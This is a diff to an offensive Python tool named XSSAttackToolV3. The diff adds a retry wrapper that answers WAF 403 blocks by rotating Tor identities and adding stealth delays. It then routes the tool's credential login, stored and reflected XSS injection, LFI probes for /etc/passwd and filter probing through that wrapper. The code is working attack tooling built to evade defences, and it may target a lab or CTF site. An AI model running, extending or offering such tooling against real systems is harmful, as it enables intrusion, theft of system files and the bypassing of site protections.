@@ -127,6 +127,42 @@ class XSSAttackToolV3:
         except Exception as e:
             print(f"{Fore.RED}[-] Failed to get new identity: {e}{Style.RESET_ALL}")
 
+    def make_request(self, url, method='GET', max_retries=3, **kwargs):
+        """403 처리가 포함된 공통 요청 함수"""
+        for attempt in range(max_retries):
+            try:
+                if method.upper() == 'GET':
+                    response = self.session.get(url, **kwargs)
+                elif method.upper() == 'POST':
+                    response = self.session.post(url, **kwargs)
+                else:
+                    response = self.session.request(method, url, **kwargs)
+                
+                # 403 처리
+                if response.status_code == 403:
+                    print(f"{Fore.RED}[-] Blocked (403) - Attempt {attempt + 1}/{max_retries}{Style.RESET_ALL}")
+                    
+                    if self.use_tor and attempt < max_retries - 1:
+                        print(f"{Fore.YELLOW}[*] Getting new Tor identity...{Style.RESET_ALL}")
+                        self.get_new_tor_identity()
+                        self.smart_delay()
+                        continue
+                    else:
+                        return response
+                
+                return response
+                
+            except Exception as e:
+                print(f"{Fore.RED}[-] Request error: {e}{Style.RESET_ALL}")
+                if attempt < max_retries - 1:
+                    if self.use_tor:
+                        self.get_new_tor_identity()
+                    time.sleep(5)
+                else:
+                    raise
+        
+        return None
+
     def smart_delay(self):
         """스텔스 모드 딜레이"""
         if self.stealth_mode:
@@ -156,11 +192,19 @@ class XSSAttackToolV3:
         print(f"\n{Fore.YELLOW}[*] Attempting login with {username}/{password}...{Style.RESET_ALL}")
         
         login_url = f"{self.target_url}/login.php"
+        
+        # 정상적인 로그인 페이지 방문
+        # 기존: self.session.get(login_url)
+        self.make_request(login_url, method='GET')  # 수정
+        self.smart_delay()
+
         data = {'username': username, 'password': password}
         
         try:
-            response = self.session.post(login_url, data=data, allow_redirects=True)
-            if 'index.php' in response.url or response.status_code == 200:
+            # 기존: response = self.session.post(login_url, data=data, allow_redirects=True)
+            response = self.make_request(login_url, method='POST', data=data, allow_redirects=True)  # 수정
+            
+            if response and ('index.php' in response.url or response.status_code == 200):
                 print(f"{Fore.GREEN}[+] Login successful!{Style.RESET_ALL}")
                 self.logged_in = True
                 return True
@@ -216,17 +260,25 @@ class XSSAttackToolV3:
             print(f"\n{Fore.YELLOW}Testing:{Style.RESET_ALL} {payload[:50]}...")
             
             # POST 테스트
-            response = self.session.post(
+            # 기존: response = self.session.post(f"{self.target_url}/new_post.php", data={'content': payload})
+            response = self.make_request(
                 f"{self.target_url}/new_post.php",
+                method='POST',
                 data={'content': payload}
-            )
+            )  # 수정
             
+            if response is None:
+                print(f"{Fore.RED}[-] Request failed{Style.RESET_ALL}")
+                continue
+                
             if response.status_code == 403:
                 print(f"{Fore.RED}[-] Blocked by WAF (403){Style.RESET_ALL}")
             elif response.status_code == 200:
                 # 주입 확인
-                check = self.session.get(f"{self.target_url}/index.php")
-                if payload in check.text:
+                # 기존: check = self.session.get(f"{self.target_url}/index.php")
+                check = self.make_request(f"{self.target_url}/index.php", method='GET')  # 수정
+                
+                if check and payload in check.text:
                     print(f"{Fore.GREEN}[+] XSS FOUND! Payload injected successfully{Style.RESET_ALL}")
                     self.successful_payloads.append(payload)
                 else:
@@ -254,7 +306,12 @@ class XSSAttackToolV3:
             print(f"\n{Fore.YELLOW}Testing:{Style.RESET_ALL} {endpoint}")
             
             try:
-                response = self.session.get(url)
+                # 기존: response = self.session.get(url)
+                response = self.make_request(url, method='GET')  # 수정
+                
+                if response is None:
+                    continue
+                    
                 if test_payload in response.text:
                     print(f"{Fore.GREEN}[+] XSS FOUND at {endpoint}{Style.RESET_ALL}")
                     self.vulnerabilities.append({
@@ -274,7 +331,6 @@ class XSSAttackToolV3:
         """file.php 취약점 테스트"""
         print(f"\n{Fore.CYAN}[*] Testing file.php vulnerabilities...{Style.RESET_ALL}")
         
-        # LFI 페이로드
         lfi_payloads = [
             '../../../etc/passwd',
             '....//....//....//etc/passwd',
@@ -288,7 +344,12 @@ class XSSAttackToolV3:
             print(f"\n{Fore.YELLOW}Testing LFI:{Style.RESET_ALL} {payload}")
             
             try:
-                response = self.session.get(url)
+                # 기존: response = self.session.get(url)
+                response = self.make_request(url, method='GET')  # 수정
+                
+                if response is None:
+                    continue
+                    
                 if 'root:' in response.text or 'www-data:' in response.text:
                     print(f"{Fore.GREEN}[+] LFI FOUND! System file accessible{Style.RESET_ALL}")
                     self.vulnerabilities.append({
@@ -325,11 +386,16 @@ class XSSAttackToolV3:
         allowed = []
         
         for test in test_strings:
-            response = self.session.post(
+            # 기존: response = self.session.post(f"{self.target_url}/new_post.php", data={'content': test})
+            response = self.make_request(
                 f"{self.target_url}/new_post.php",
+                method='POST',
                 data={'content': test}
-            )
+            )  # 수정
             
+            if response is None:
+                continue
+                
             if response.status_code == 403:
                 blocked.append(test)
                 print(f"{Fore.RED}[-] BLOCKED: {test}{Style.RESET_ALL}")
